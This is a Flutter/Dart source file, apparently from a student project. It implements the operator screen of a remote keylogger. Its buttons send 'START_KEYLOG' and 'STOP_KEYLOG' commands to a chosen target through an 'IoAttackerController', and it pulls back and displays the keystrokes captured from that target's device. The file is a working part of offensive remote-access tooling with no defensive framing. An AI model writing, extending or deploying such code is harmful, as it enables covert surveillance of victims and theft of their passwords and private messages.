import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:inferno_core_fyp/res/helper_extensions.dart';

import '../../res/constants.dart';
import '../../res/widgets/button components/my_text_btn.dart';
import '../../res/widgets/input field components/big_input_field.dart';
import '../../view models/controllers/general_controller.dart';
import '../../view models/controllers/io_attacker_controller.dart';

class KeyLogger extends StatelessWidget {
  final String targetId;

  const KeyLogger({super.key, required this.targetId});

  @override
  Widget build(BuildContext context) {
    GeneralController generalController = Get.put(GeneralController());
    IoAttackerController ioAttackerController = Get.put(IoAttackerController());
    return Scaffold(
      appBar: AppBar(title: const Text("KeyLogs"), centerTitle: true),
      body: SingleChildScrollView(
        physics: const BouncingScrollPhysics(),
        child: Padding(
          padding: const EdgeInsets.all(kDefaultPadding),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.end,
            children: [
              Obx(
                () => BigInputField(
                  readOnly: true,
                  height: Get.height * .5,
                  hintText: "No KeyLogs yet",
                  textColor: blackColor,
                  controller: TextEditingController(
                    text: generalController.keyloggerData.value,
                  ),
                ),
              ),
              30.ph,
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                children: [
                  MyTextButton(
                    text: "Start",
                    onPressed: () {
                      ioAttackerController.submitCommand(
                        targetId: targetId,
                        data: {
                          "text": 'START_KEYLOG',
                          "command_args": {},
                        },
                      );
                    },
                    width: 100,
                    radius: 6,
                    spacing: 1.3,
                  ),
                  MyTextButton(
                    text: "Stop",
                    onPressed: () {
                      ioAttackerController.submitCommand(
                        targetId: targetId,
                        data: {
                          "text": 'STOP_KEYLOG',
                          "command_args": {},
                        },
                      );
                    },
                    width: 100,
                    radius: 6,
                    spacing: 1.3,
                  ),
                ],
              ),
              30.ph,
              Center(
                child: MyTextButton(
                  text: "Get data",
                  onPressed: () {
                    generalController.getKeyloggerData(targetId);
                  },
                  width: 120,
                  radius: 6,
                  spacing: 1.3,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}